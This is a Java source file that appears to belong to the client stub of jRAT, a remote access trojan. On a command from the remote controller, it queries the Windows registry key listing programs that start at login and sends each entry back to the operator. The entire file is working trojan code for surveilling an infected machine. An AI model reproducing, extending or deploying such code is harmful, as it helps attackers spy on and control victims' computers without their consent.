package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet53RegistryStartup;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.oslib.OperatingSystem;


public class Packet78RegistryStartup extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");

					con.addToSendQueue(new Packet53RegistryStartup(args));
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			con.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
